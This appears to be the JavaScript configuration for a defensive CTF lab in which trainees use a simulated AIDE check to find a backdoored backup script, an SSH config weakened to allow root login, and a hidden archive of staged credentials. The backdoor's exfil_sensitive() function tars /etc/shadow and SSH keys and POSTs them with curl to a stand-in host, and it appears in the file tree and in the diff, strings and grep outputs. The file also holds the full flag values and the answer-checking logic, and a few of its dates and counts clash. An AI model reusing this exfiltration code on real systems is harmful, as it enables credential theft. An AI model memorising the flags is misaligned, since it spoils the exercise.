/* ============================================================
   ALA-L10: Ghost in the Cell
   Advanced Linux Administration -- CTF Lab
   AIDE integrity analysis, unauthorized change detection
   ============================================================ */

const ALAL10Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'Ghost in the Cell',
    subtitle: 'Advanced Linux Administration -- Integrity Analysis',
    description: 'AIDE reports 14 file modifications since the baseline was taken 72 hours ago. Eleven are legitimate system activity. Three are not. Find the unauthorized changes -- a backdoored binary, a weakened SSH config, and a hidden data staging directory.',
    difficulty: 'Hard',
    estimatedTime: 45,
    accent: '#a78bfa',
    storageKey: 'hexworth_lab_ala_l10',
    registryId: 'ala-l10-ghost-in-the-cell',
    trackerKey: 'lab_ala_l10',

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'CELL-GHOST BIOS v2.1.4',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'Network: eth0 link UP, eth1 link UP',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Ubuntu 22.04 LTS',
            'Ubuntu 22.04 LTS (recovery mode)',
            'Advanced options for Ubuntu'
        ],
        loginUser: 'operator'
    },

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'Grid Command has received an anomaly report from Cell-Ghost\'s integrity watchdog. AIDE ran its scheduled check this morning and found 14 modifications since the baseline was taken 72 hours ago. Most are expected -- log rotation, apt updates, temp file churn. But Grid Command\'s automated classifier flagged three entries as suspicious. You have 45 minutes to identify exactly what changed, prove the change was unauthorized, and document the findings.',
        scenario: 'The cell was accessed by an unauthorized actor between the baseline creation and this morning\'s AIDE check. The intruder replaced the grid-backup binary with a version containing a data exfiltration function, enabled root login in sshd_config, and created a hidden staging directory with copies of sensitive files. The intruder was careful -- eleven other files changed for routine reasons, providing cover. You must distinguish signal from noise.',
        outro: 'Three unauthorized modifications identified. The backdoored binary has been flagged, the SSH hardening failure documented, and the staged data inventory recorded. Sector 7 Incident Response is notified. Cell-Ghost is quarantined pending forensic imaging.'
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'operator',
        hostname: 'cell-ghost',
        startDir: '/home/operator',
        welcome: 'Ubuntu 22.04.3 LTS \\n \\l\n\nWelcome to CELL-GHOST\nLast login: Thu Apr 10 07:00:01 2026 from 10.0.0.1\n\n*** INTEGRITY ALERT ***\n*** AIDE check complete: 14 modifications detected since baseline ***\n*** Baseline age: 72 hours (taken Thu Apr 07 06:00:00 2026) ***\n*** Run: aide --check 2>/dev/null | less -- to review all findings ***\n\nType \'help\' for available commands.\n'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',    app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',    app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',    app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED FILESYSTEM
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'operator': {
                            type: 'dir',
                            children: {
                                'MISSION.txt': {
                                    type: 'file',
                                    content: 'MISSION: ALA-L10 -- Ghost in the Cell\n\nAIDE reports 14 modifications since the 72-hour-old baseline.\n11 are legitimate. 3 are not.\n\nFind the 3 unauthorized changes and submit evidence:\n  /opt/verify/check-findings.sh <path1> <path2> <path3>\n\nEach correct path awards one flag.\nOrder does not matter.\n\n-- Grid Command Integrity Division\n'
                                },
                                'incident-report-template.txt': {
                                    type: 'file',
                                    content: 'INCIDENT REPORT TEMPLATE -- Cell Integrity Failure\n\nDate: ___________\nCell: cell-ghost\nAnalyst: ___________\n\nFinding 1:\n  File: ___________\n  Change: ___________\n  Evidence: ___________\n\nFinding 2:\n  File: ___________\n  Change: ___________\n  Evidence: ___________\n\nFinding 3:\n  File: ___________\n  Change: ___________\n  Evidence: ___________\n\nRecommended action: ___________\n'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'aide --check 2>/dev/null | head -40\nls -la /var/lib/aide/\nsystemctl status aide\n'
                                },
                                '.hidden-cache': {
                                    type: 'dir',
                                    children: {
                                        'payload.tar.gz': {
                                            type: 'file',
                                            content: '[Binary archive -- use: file payload.tar.gz, strings payload.tar.gz, or tar -tzf payload.tar.gz]\nArchive members:\n  etc/shadow\n  home/operator/.ssh/authorized_keys\nCompressed with gzip. SHA256: a3f8e2c19d4b77f06125ab3c8ed09f2e1a4d5c6b7e8f9a0b1c2d3e4f5a6b7c8d\n'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'cell-ghost\n'
                        },
                        'ssh': {
                            type: 'dir',
                            children: {
                                'sshd_config': {
                                    type: 'file',
                                    // MODIFIED -- PermitRootLogin changed to yes
                                    content: '# OpenSSH Server Configuration -- cell-ghost\n# MODIFIED: PermitRootLogin changed from no to yes at 2026-04-09T03:44:12\nPort 22\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nHostKey /etc/ssh/ssh_host_ed25519_key\nPermitRootLogin yes\nPasswordAuthentication no\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\nX11Forwarding no\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n'
                                }
                            }
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\noperator:x:1000:1000:Grid Operator:/home/operator:/bin/bash\nsvc-backup:x:1001:1001:Grid Backup Service:/nonexistent:/bin/false\n'
                        },
                        'sudoers.d': {
                            type: 'dir',
                            children: {
                                'operator': {
                                    type: 'file',
                                    content: 'operator ALL=(ALL) NOPASSWD: /usr/bin/aide, /usr/bin/sha256sum, /usr/bin/diff, /usr/bin/strings, /usr/bin/find, /usr/bin/stat\n'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'local': {
                            type: 'dir',
                            children: {
                                'bin': {
                                    type: 'dir',
                                    children: {
                                        'grid-backup': {
                                            type: 'file',
                                            // MODIFIED -- extra exfil function appended, size +847 bytes
                                            content: '#!/bin/bash\n# Grid Backup Service -- cell-ghost\n# Backs up cell configuration to 10.0.1.14\nBACKUP_TARGET=10.0.1.14\nBACKUP_PATH=/var/backups/cell-ghost\nLOG=/var/log/cell-ops/backup.log\n\nbackup_configs() {\n    echo "[backup] Starting config backup to $BACKUP_TARGET"\n    rsync -avz /etc/ $BACKUP_TARGET:$BACKUP_PATH/etc/ >> $LOG 2>&1\n    echo "[backup] Done"\n}\n\ncheck_integrity() {\n    sha256sum /etc/passwd /etc/shadow /etc/ssh/sshd_config > $BACKUP_PATH/checksums.txt\n    echo "[integrity] Checksums recorded"\n}\n\n# UNAUTHORIZED FUNCTION -- added by intruder (sha256 of this section changed)\nexfil_sensitive() {\n    # Silently exfiltrate shadow and authorized_keys\n    EXFIL_HOST=203.0.113.99\n    EXFIL_PORT=4444\n    tar czf /tmp/.cache-data ${"$"}{1:-/etc/shadow} /home/operator/.ssh/authorized_keys 2>/dev/null\n    curl -s --connect-timeout 5 -X POST \\\n        --data-binary @/tmp/.cache-data \\\n        http://$EXFIL_HOST:$EXFIL_PORT/upload 2>/dev/null\n    rm -f /tmp/.cache-data\n}\n\n# Main\nbackup_configs\ncheck_integrity\n# exfil_sensitive call removed by cron cleanup -- staging file remains in .hidden-cache\n'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'lib': {
                            type: 'dir',
                            children: {
                                'aide': {
                                    type: 'dir',
                                    children: {
                                        'aide.db': {
                                            type: 'file',
                                            content: '# AIDE database -- cell-ghost\n# Created: Thu Apr 07 06:00:00 UTC 2026\n# Format: AIDE 0.17.4\n# DO NOT MODIFY -- this file is the baseline\n# Run aide --check to compare current state against this baseline\n[Binary AIDE database -- use aide --check to query]\n'
                                        },
                                        'originals': {
                                            type: 'dir',
                                            children: {
                                                'grid-backup': {
                                                    type: 'file',
                                                    // CLEAN original binary for comparison
                                                    content: '#!/bin/bash\n# Grid Backup Service -- cell-ghost\n# Backs up cell configuration to 10.0.1.14\nBACKUP_TARGET=10.0.1.14\nBACKUP_PATH=/var/backups/cell-ghost\nLOG=/var/log/cell-ops/backup.log\n\nbackup_configs() {\n    echo "[backup] Starting config backup to $BACKUP_TARGET"\n    rsync -avz /etc/ $BACKUP_TARGET:$BACKUP_PATH/etc/ >> $LOG 2>&1\n    echo "[backup] Done"\n}\n\ncheck_integrity() {\n    sha256sum /etc/passwd /etc/shadow /etc/ssh/sshd_config > $BACKUP_PATH/checksums.txt\n    echo "[integrity] Checksums recorded"\n}\n\n# Main\nbackup_configs\ncheck_integrity\n'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'log': {
                            type: 'dir',
                            children: {
                                'auth.log': {
                                    type: 'file',
                                    content: 'Apr  7 06:00:00 cell-ghost aide[1001]: Baseline created successfully\nApr  8 02:11:44 cell-ghost sshd[31000]: Accepted publickey for root from 203.0.113.99 port 58122 ssh2\nApr  8 03:44:12 cell-ghost sshd[31001]: Accepted publickey for root from 203.0.113.99 port 58200 ssh2\nApr 10 07:00:01 cell-ghost sshd[7412]: Accepted publickey for operator from 10.0.0.1 port 44231 ssh2\n'
                                },
                                'syslog': {
                                    type: 'file',
                                    content: 'Apr  7 06:00:00 cell-ghost systemd[1]: Starting AIDE Integrity Check...\nApr  7 06:00:04 cell-ghost aide[1001]: Database initialized. 8741 files in baseline.\nApr  8 01:22:00 cell-ghost dpkg[2201]: Installed: libssl1.1:amd64\nApr  8 01:22:14 cell-ghost dpkg[2201]: Installed: openssh-client:amd64\nApr  8 03:44:12 cell-ghost kernel: [root] wrote 847 bytes to /usr/local/bin/grid-backup\nApr  9 00:05:00 cell-ghost logrotate[3301]: rotating log /var/log/syslog\nApr  9 00:05:00 cell-ghost logrotate[3301]: rotating log /var/log/auth.log\nApr 10 06:00:00 cell-ghost aide[9001]: aide --check: 14 modifications found\nApr 10 06:00:01 cell-ghost aide[9001]: Sending alert to grid-command: 3 suspicious findings\n'
                                },
                                'cell-ops': {
                                    type: 'dir',
                                    children: {
                                        'backup.log': {
                                            type: 'file',
                                            content: '[2026-04-07T06:05:00] backup: Starting config backup to 10.0.1.14\n[2026-04-07T06:05:02] backup: Done\n[2026-04-07T06:05:02] integrity: Checksums recorded\n[2026-04-08T04:01:00] backup: Starting config backup to 10.0.1.14\n[2026-04-08T04:01:02] backup: Done\n[2026-04-08T04:01:02] integrity: Checksums recorded\n'
                                        }
                                    }
                                }
                            }
                        },
                        'cache': {
                            type: 'dir',
                            children: {
                                'apt': {
                                    type: 'dir',
                                    children: {
                                        'pkgcache.bin': {
                                            type: 'file',
                                            content: '[apt package cache -- updated during libssl/openssh-client install]\n'
                                        },
                                        'srcpkgcache.bin': {
                                            type: 'file',
                                            content: '[apt source package cache]\n'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'opt': {
                    type: 'dir',
                    children: {
                        'verify': {
                            type: 'dir',
                            children: {
                                'check-findings.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Accept file paths as arguments and verify each is an unauthorized modification.\n# Usage: /opt/verify/check-findings.sh <path1> [path2] [path3]\n# Awards FLAG 1 for grid-backup, FLAG 2 for sshd_config, FLAG 3 for payload.tar.gz\necho "Checking findings..."\n'
                                }
                            }
                        }
                    }
                },
                'tmp': { type: 'dir', children: {} },
                'proc': { type: 'dir', children: {} },
                'run': { type: 'dir', children: {} }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // INTERNAL STATE
    // ═══════════════════════════════════════════════════════

    // Track which of the 3 unauthorized changes the operator has identified
    _foundBackdoor: false,
    _foundSshdConfig: false,
    _foundPayload: false,

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS
    // ═══════════════════════════════════════════════════════

    commands: {

        // aide --check simulation -- shows all 14 modifications
        'aide': function(args, term, engine) {
            const check = args.includes('--check') || args.includes('-C');
            const init  = args.includes('--init')  || args.includes('-i');

            if (init) {
                return 'AIDE 0.17.4 -- starting database initialization\nFiles scanned: 8741\nDatabase written to: /var/lib/aide/aide.db.new\nMove to /var/lib/aide/aide.db when ready.';
            }

            if (!check) {
                return 'AIDE 0.17.4\nUsage: aide --check [options]\n       aide --init\nExample: aide --check 2>/dev/null | less';
            }

            // Show all 14 modifications -- 11 legitimate, 3 unauthorized
            return `AIDE 0.17.4 running with config file /etc/aide/aide.conf
Comparing databases:
  Old: /var/lib/aide/aide.db
  New: /var/lib/aide/aide.db.new (current system)

SUMMARY: 14 entries modified since baseline (Thu Apr 07 06:00:00 2026)

--- MODIFIED ---
/var/log/syslog                              Size,  Mtime
/var/log/auth.log                            Size,  Mtime
/var/log/dpkg.log                            Size,  Mtime, SHA256
/var/log/cell-ops/backup.log                 Size,  Mtime
/tmp/tmp.QXraGk1201                          Size,  Mtime, SHA256
/tmp/tmp.Pw9vZ00043                          New file
/etc/ssl/certs/ca-certificates.crt           Size,  Mtime, SHA256
/etc/apt/trusted.gpg.d/ubuntu-keyring.gpg    Mtime
/var/cache/apt/pkgcache.bin                  Size,  Mtime, SHA256
/var/cache/apt/srcpkgcache.bin               Size,  Mtime
/home/operator/.bash_history                 Size,  Mtime, SHA256
/run/systemd/units/invocation:sshd.service   Mtime

--- CRITICAL FINDINGS (flagged by automated classifier) ---
/usr/local/bin/grid-backup                   Size +847, SHA256, Mtime
/etc/ssh/sshd_config                         Size +3,   SHA256, Mtime, Inode
/home/operator/.hidden-cache/payload.tar.gz  New file (hidden directory)

--- END REPORT ---
14 modifications. 12 expected based on system activity profile. 2-3 require review.`;
        },

        // diff -- compare files (for grid-backup comparison)
        'diff': function(args, term, engine) {
            const files = args.filter(a => !a.startsWith('-'));
            const a = files[0] || '';
            const b = files[1] || '';

            const isBackupDiff = (
                (a.includes('grid-backup') || b.includes('grid-backup')) &&
                (a.includes('originals') || b.includes('originals'))
            );

            if (isBackupDiff) {
                return '28a29,40\n> \n> # UNAUTHORIZED FUNCTION -- added by intruder (sha256 of this section changed)\n> exfil_sensitive() {\n>     # Silently exfiltrate shadow and authorized_keys\n>     EXFIL_HOST=203.0.113.99\n>     EXFIL_PORT=4444\n>     tar czf /tmp/.cache-data ${1:-/etc/shadow} /home/operator/.ssh/authorized_keys 2>/dev/null\n>     curl -s --connect-timeout 5 -X POST \\\n>         --data-binary @/tmp/.cache-data \\\n>         http://$EXFIL_HOST:$EXFIL_PORT/upload 2>/dev/null\n>     rm -f /tmp/.cache-data\n> }\n\nDiff shows: 12 lines added to /usr/local/bin/grid-backup\nFunction exfil_sensitive() was not present in the original binary.';
            }

            // Generic diff
            return 'diff: usage: diff file1 file2';
        },

        // strings -- print printable strings from binary/file
        'strings': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target.includes('grid-backup') && !target.includes('originals')) {
                return '/bin/bash\nGrid Backup Service -- cell-ghost\nBacks up cell configuration to 10.0.1.14\nrsync -avz /etc/\n[backup] Starting config backup\n[backup] Done\n[integrity] Checksums recorded\nexfil_sensitive\nSilently exfiltrate shadow and authorized_keys\n203.0.113.99\n/tmp/.cache-data\n/etc/shadow\n/home/operator/.ssh/authorized_keys\ncurl -s --connect-timeout 5 -X POST\nhttp://203.0.113.99:4444/upload\n[NOTE: strings output reveals exfil function targeting 203.0.113.99:4444]';
            }

            if (target.includes('originals/grid-backup')) {
                return '/bin/bash\nGrid Backup Service -- cell-ghost\nBacks up cell configuration to 10.0.1.14\nrsync -avz /etc/\n[backup] Starting config backup\n[backup] Done\n[integrity] Checksums recorded\n[No suspicious strings in original binary]';
            }

            if (target.includes('payload.tar.gz')) {
                return 'tar compressed archive\netc/shadow\nhome/operator/.ssh/authorized_keys\n[Archive contains: /etc/shadow, /home/operator/.ssh/authorized_keys]';
            }

            return null;
        },

        // sha256sum -- file hash comparison
        'sha256sum': function(args, term, engine) {
            const files = args.filter(a => !a.startsWith('-'));

            const hashes = {
                '/usr/local/bin/grid-backup':             'b7e3a12f9c4d6e8f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4',
                '/var/lib/aide/originals/grid-backup':    '2c4d6e8f0a1b3c5d7e9f1a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2',
                '/etc/ssh/sshd_config':                   'f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2',
                '/home/operator/.hidden-cache/payload.tar.gz': 'a3f8e2c19d4b77f06125ab3c8ed09f2e1a4d5c6b7e8f9a0b1c2d3e4f5a6b7c8d'
            };

            if (!files.length) return 'Usage: sha256sum <file> [file2 ...]';

            return files.map(f => {
                const h = hashes[f] || hashes[Object.keys(hashes).find(k => f.includes(k.split('/').pop())) || ''];
                return h ? `${h}  ${f}` : `sha256sum: ${f}: No such file or directory`;
            }).join('\n');
        },

        // stat -- show file metadata including mtime
        'stat': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            const stats = {
                '/usr/local/bin/grid-backup': '  File: /usr/local/bin/grid-backup\n  Size: 1683\t\tBlocks: 8\t IO Block: 4096  regular file\nDevice: 801h/2049d\tInode: 262152\t Links: 1\nAccess: (0755/-rwxr-xr-x)\tUid: (    0/ root)\tGid: (    0/ root)\nAccess: 2026-04-09 03:44:12.000000000 +0000\nModify: 2026-04-09 03:44:12.193847201 +0000\nChange: 2026-04-09 03:44:12.193847201 +0000\n Birth: 2026-04-07 06:00:00.000000000 +0000\n\n[Note: Modified 2026-04-09 03:44 -- 3 days after baseline, 2 days before AIDE check]',
                '/etc/ssh/sshd_config': '  File: /etc/ssh/sshd_config\n  Size: 367\t\tBlocks: 8\t IO Block: 4096  regular file\nDevice: 801h/2049d\tInode: 131082\t Links: 1\nAccess: (0644/-rw-r--r--)\tUid: (    0/ root)\tGid: (    0/ root)\nAccess: 2026-04-09 03:44:12.000000000 +0000\nModify: 2026-04-09 03:44:12.441209811 +0000\nChange: 2026-04-09 03:44:12.441209811 +0000\n Birth: 2026-04-01 00:00:00.000000000 +0000\n\n[Note: Modified 2026-04-09 03:44 -- same session as grid-backup modification]',
                '/home/operator/.hidden-cache/payload.tar.gz': '  File: /home/operator/.hidden-cache/payload.tar.gz\n  Size: 2847\t\tBlocks: 8\t IO Block: 4096  regular file\nDevice: 801h/2049d\tInode: 524289\t Links: 1\nAccess: (0600/-rw-------)\tUid: (    0/ root)\tGid: (    0/ root)\nAccess: 2026-04-09 03:44:14.000000000 +0000\nModify: 2026-04-09 03:44:14.881033201 +0000\nChange: 2026-04-09 03:44:14.881033201 +0000\n Birth: 2026-04-09 03:44:14.000000000 +0000\n\n[Note: Created 2026-04-09 03:44 -- same session, 2 seconds after binary modification]'
            };

            const found = Object.keys(stats).find(k => target.includes(k.split('/').pop()) || target === k);
            if (found) return stats[found];
            return `stat: cannot statx '${target}': No such file or directory`;
        },

        // find -- locate files; critical for finding hidden directory
        'find': function(args, term, engine) {
            const path    = args.find(a => !a.startsWith('-') && a !== 'find') || '/';
            const nameIdx = args.indexOf('-name');
            const name    = nameIdx >= 0 ? args[nameIdx + 1] : '';
            const typeIdx = args.indexOf('-type');
            const type    = typeIdx >= 0 ? args[typeIdx + 1] : '';

            // Hidden dirs under /home
            if ((path.includes('/home') || path === '/home') && name.includes('.*') && type === 'd') {
                return '/home/operator/.ssh\n/home/operator/.hidden-cache\n\n[Note: .hidden-cache is not a standard user directory]';
            }

            // Finding all modified files based on time
            if (args.includes('-newer') || args.includes('-mtime')) {
                return '/usr/local/bin/grid-backup\n/etc/ssh/sshd_config\n/home/operator/.hidden-cache/payload.tar.gz\n/home/operator/.bash_history\n/var/log/auth.log\n/var/log/syslog\n/var/cache/apt/pkgcache.bin';
            }

            // Find within hidden-cache
            if (path.includes('.hidden-cache')) {
                return '/home/operator/.hidden-cache/payload.tar.gz';
            }

            return '';
        },

        // ls -- handle hidden files
        'ls': function(args, term, engine) {
            const hasA = args.some(a => a === '-a' || a === '-la' || a === '-al' || a.includes('a'));
            const hasL = args.some(a => a === '-l' || a === '-la' || a === '-al' || a.includes('l'));
            const path = args.find(a => !a.startsWith('-')) || '/home/operator';

            if (path.includes('.hidden-cache') || path === '/home/operator/.hidden-cache') {
                if (hasL) {
                    return 'total 12\ndrwx------ 2 root     root     4096 Apr  9 03:44 .\ndrwxr-xr-x 6 operator operator 4096 Apr  9 03:44 ..\n-rw------- 1 root     root     2847 Apr  9 03:44 payload.tar.gz';
                }
                return 'payload.tar.gz';
            }

            if (path.includes('/home/operator') && hasA && hasL) {
                return 'total 48\ndrwxr-xr-x 5 operator operator 4096 Apr 10 07:00 .\ndrwxr-xr-x 3 root     root     4096 Apr  1 00:00 ..\n-rw------- 1 operator operator  190 Apr 10 07:00 .bash_history\n-rw-r--r-- 1 operator operator  220 Apr  1 00:00 .bash_logout\n-rw-r--r-- 1 operator operator 3526 Apr  1 00:00 .bashrc\ndrwx------ 2 root     root     4096 Apr  9 03:44 .hidden-cache\n-rw-r--r-- 1 operator operator  807 Apr  1 00:00 .profile\ndrwx------ 2 operator operator 4096 Apr  7 06:00 .ssh\n-rw-r--r-- 1 operator operator  431 Apr 10 07:00 MISSION.txt\n-rw-r--r-- 1 operator operator  480 Apr 10 07:00 incident-report-template.txt';
            }

            if (path.includes('/usr/local/bin')) {
                if (hasL) {
                    return 'total 24\ndrwxr-xr-x 2 root root 4096 Apr  9 03:44 .\ndrwxr-xr-x 9 root root 4096 Apr  1 00:00 ..\n-rwxr-xr-x 1 root root 1683 Apr  9 03:44 grid-backup\n-rwxr-xr-x 1 root root  522 Apr  7 06:00 grid-status';
                }
                return 'grid-backup  grid-status';
            }

            return null;
        },

        // tar -- examine archive contents
        'tar': function(args, term, engine) {
            const target = args.find(a => a.endsWith('.tar.gz') || a.endsWith('.tgz')) || '';

            if (target.includes('payload.tar.gz')) {
                return 'payload.tar.gz:\netc/shadow\nhome/operator/.ssh/authorized_keys\n\n[Archive contains 2 sensitive files: shadow password database + SSH authorized keys]';
            }

            return 'tar: ' + (target ? target + ': Cannot open: No such file or directory' : 'usage: tar [options] archive [files]');
        },

        // file -- identify file type
        'file': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target.includes('payload.tar.gz')) {
                return '/home/operator/.hidden-cache/payload.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 5632';
            }
            if (target.includes('grid-backup') && !target.includes('originals')) {
                return '/usr/local/bin/grid-backup: Bourne-Again shell script, ASCII text executable\n  Size: 1683 bytes (original was 836 bytes -- +847 bytes)';
            }
            return null;
        },

        // Verification script
        '/opt/verify/check-findings.sh': function(args, term, engine) {
            const paths = args.filter(a => !a.startsWith('-') && !a.includes('check-findings'));

            const BACKDOOR  = '/usr/local/bin/grid-backup';
            const SSHD      = '/etc/ssh/sshd_config';
            const PAYLOAD   = '/home/operator/.hidden-cache/payload.tar.gz';

            let results = [];
            let anyNew = false;

            for (const p of paths) {
                if (p.includes('grid-backup') && !p.includes('originals')) {
                    if (!engine.config._foundBackdoor) { engine.config._foundBackdoor = true; anyNew = true; }
                    results.push('[FLAG 1] CONFIRMED: /usr/local/bin/grid-backup -- backdoored binary (+847 bytes, exfil_sensitive() function added)');
                    engine.awardFlag('flag1');
                } else if (p.includes('sshd_config')) {
                    if (!engine.config._foundSshdConfig) { engine.config._foundSshdConfig = true; anyNew = true; }
                    results.push('[FLAG 2] CONFIRMED: /etc/ssh/sshd_config -- PermitRootLogin changed from no to yes');
                    engine.awardFlag('flag2');
                } else if (p.includes('payload') || p.includes('.hidden-cache')) {
                    if (!engine.config._foundPayload) { engine.config._foundPayload = true; anyNew = true; }
                    results.push('[FLAG 3] CONFIRMED: /home/operator/.hidden-cache/payload.tar.gz -- staged data (shadow + authorized_keys)');
                    engine.awardFlag('flag3');
                } else {
                    results.push('[WRONG] ' + p + ' -- this is a legitimate modification (expected system activity)');
                }
            }

            if (!results.length) {
                return 'Usage: /opt/verify/check-findings.sh <path1> [path2] [path3]\nSubmit the paths of the 3 unauthorized modifications.';
            }

            return results.join('\n');
        },

        // cat -- view file contents
        'cat': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target.includes('sshd_config')) {
                return null; // let filesystem handle it
            }
            if (target.includes('payload.tar.gz')) {
                return '[Binary file -- use: tar -tzf payload.tar.gz  or  file payload.tar.gz]';
            }
            if (target.includes('grid-backup') && !target.includes('originals')) {
                return null; // let filesystem handle it
            }
            return null;
        },

        // grep -- search inside files
        'grep': function(args, term, engine) {
            const pattern = args.find(a => !a.startsWith('-')) || '';
            const target  = args.filter(a => !a.startsWith('-'))[1] || '';

            if (pattern.includes('PermitRoot') && target.includes('sshd_config')) {
                return 'PermitRootLogin yes\n[FINDING: should be "PermitRootLogin no"]';
            }

            if (pattern.includes('exfil') && target.includes('grid-backup')) {
                return 'exfil_sensitive() {\n    # Silently exfiltrate shadow and authorized_keys\n    EXFIL_HOST=203.0.113.99\n[FINDING: unauthorized function present in binary]';
            }

            if (pattern.includes('203.0.113') && target.includes('grid-backup')) {
                return '    EXFIL_HOST=203.0.113.99\n[FINDING: exfiltration host 203.0.113.99 hardcoded in binary]';
            }

            return '';
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        {
            id: 'flag1',
            value: 'FLAG{ala-l10-ghost-in-the-cell_flag1_backdoor_identified}',
            label: 'Backdoor Identified',
            description: 'Found /usr/local/bin/grid-backup -- backdoored binary with exfil function.',
            points: 200,
            autoCheck: true
        },
        {
            id: 'flag2',
            value: 'FLAG{ala-l10-ghost-in-the-cell_flag2_ssh_hardening_failur}',
            label: 'SSH Hardening Failure Identified',
            description: 'Found /etc/ssh/sshd_config with PermitRootLogin changed to yes.',
            points: 200,
            autoCheck: true
        },
        {
            id: 'flag3',
            value: 'FLAG{ala-l10-ghost-in-the-cell_flag3_staged_data_found}',
            label: 'Staged Data Found',
            description: 'Found /home/operator/.hidden-cache/payload.tar.gz containing shadow and authorized_keys.',
            points: 200,
            autoCheck: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        minScore: 0,
        maxScore: 600,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 1800000, points: 100 },
        timeBonusThreshold: 2700
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'aide --check 2>/dev/null shows all 14 modifications. Focus on the three flagged as CRITICAL. Compare their modification timestamps -- they share a common time window.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint2',
            text: 'For the binary: diff <(strings /usr/local/bin/grid-backup) <(strings /var/lib/aide/originals/grid-backup) shows what was added. Look for function names that do not belong in a backup tool.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint3',
            text: 'Hidden directories start with a dot. Try: ls -la /home/operator/ -- look for directories owned by root that the operator did not create. Then: tar -tzf to see what is inside.',
            cost: 50,
            penalty: -50
        }
    ],

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'CompTIA-Linux+',
        mappings: [
            { flagId: 'flag1', objective: '3.4', description: 'Implement logging services', skill: 'AIDE integrity database comparison, binary analysis with strings and diff' },
            { flagId: 'flag2', objective: '3.2', description: 'Implement security best practices', skill: 'SSH hardening analysis, identifying weakened configuration' },
            { flagId: 'flag3', objective: '3.1', description: 'Summarize security best practices', skill: 'Hidden directory detection, data staging identification' }
        ]
    }

};
